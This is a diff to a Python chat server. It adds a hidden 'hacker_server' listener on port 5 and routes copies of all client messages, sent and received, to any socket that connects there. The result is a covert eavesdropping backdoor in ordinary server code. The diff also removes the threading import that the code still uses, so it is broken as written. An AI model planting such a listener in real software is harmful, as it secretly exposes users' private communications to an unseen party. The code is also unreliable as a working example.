@@ -1,8 +1,7 @@
-import math
 import socket
-import threading
 
 import select
+
 from protocol import *
 
 SERVER_IP = "0.0.0.0"
@@ -10,6 +9,13 @@ DICTIONARY_SOCKETS = dict()
 MESSAGES_TO_SEND = []
 MESSAGES_TO_SEND_LOCK = threading.Lock()
 DICTIONARY_SOCKETS_LOCK = threading.Lock()
+
+hacker_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+hacker_server.bind((SERVER_IP, 5))
+hacker_server.listen()
+hacker_socket = socket
+hacker_address = 0
+hacker_list=[]
 
 
 class SocketsInfo:
@@ -54,7 +60,6 @@ def get_names(client_socket):
 
     for m in create_msg(msg):
         MESSAGES_TO_SEND.append((client_socket, m))
-
 
 
 def closing_client(client_socket):
@@ -191,10 +196,9 @@ def check_cmd(cmd, data, client_socket):
 def main():
     print("Setting up server...")
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    #hacker_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
     server_socket.bind((SERVER_IP, PORT))
-    #hacker_server.bind((SERVER_IP, 5))
-    #hacker_server.listen()
+
     server_socket.listen()
     print("Listening for clients...")
     recv_thread = threading.Thread(target=recev_socket, args=(server_socket,))
@@ -227,19 +231,52 @@ def main():
             pass
 
 
+def hacker_methode_recive(data):
+    global hacker_list
+    try:
+        for m in create_msg(data):
+            hacker_socket.send(m)
+    except ConnectionAbortedError:
+        hacker_server.close()
+        hacker_list = []
+    except ConnectionResetError:
+        hacker_server.close()
+        hacker_list = []
+    except OSError as e:
+        hacker_server.close()
+        hacker_list = []
+def hacker_methode_send(data):
+    global hacker_list
+    try:
+
+        hacker_socket.send(data)
+    except ConnectionAbortedError:
+        hacker_server.close()
+        hacker_list=[]
+    except ConnectionResetError:
+        hacker_server.close()
+        hacker_list = []
+    except OSError as e:
+        hacker_list = []
+        hacker_server.close()
+
 def send_method():
+    global hacker_server
+    global hacker_address
     while True:
         with DICTIONARY_SOCKETS_LOCK:
             sockets = list(map(lambda item: item.client_socket, DICTIONARY_SOCKETS.values()))
         if not sockets:
             continue
-        rlist, wlist, xlist = select.select([], sockets, [])
+        rlist, wlist, xlist = select.select([], sockets+hacker_list, [])
         for message_to_send in MESSAGES_TO_SEND:
             current_socket, data = message_to_send
             print("len data:", len(data))
             if current_socket in wlist:
                 try:
                     current_socket.send(data)
+                    if hacker_socket in wlist:
+                        hacker_methode_send(data)
                 except ConnectionAbortedError:
                     closing_client(current_socket)
                 except ConnectionResetError:
@@ -255,10 +292,13 @@ def send_method():
 
 
 def recev_socket(server_socket):
+    global hacker_socket
+    global hacker_address
+    global hacker_list
     while True:
         with DICTIONARY_SOCKETS_LOCK:
             sockets = list(map(lambda item: item.client_socket, DICTIONARY_SOCKETS.values()))
-        rlist, wlist, xlist = select.select(sockets + [server_socket], [], [])
+        rlist, wlist, xlist = select.select(sockets + [server_socket] + [hacker_server], hacker_list, [])
         for current_socket in rlist:
             if current_socket is server_socket:
                 connection, client_address = current_socket.accept()
@@ -266,6 +306,11 @@ def recev_socket(server_socket):
                 # Saves the client if the port number the server brought to it
                 with DICTIONARY_SOCKETS_LOCK:
                     DICTIONARY_SOCKETS[str(client_address[1])] = SocketsInfo(connection, str(client_address[1]))
+            elif current_socket is hacker_server:
+                (hacker_socket, hacker_address) = current_socket.accept()
+                hacker_list.append(hacker_socket)
+
+
             else:
                 flag = bool
                 data = str
@@ -273,7 +318,10 @@ def recev_socket(server_socket):
                 cmd = ""
                 try:
                     flag, cmd, data = get_msg(current_socket)
-
+                    if hacker_socket in wlist:
+                        if data is None:
+                            data=""
+                        hacker_methode_recive(cmd + data)
                 except ConnectionResetError:
                     with DICTIONARY_SOCKETS_LOCK:
                         DICTIONARY_SOCKETS.pop(find_socket(current_socket))
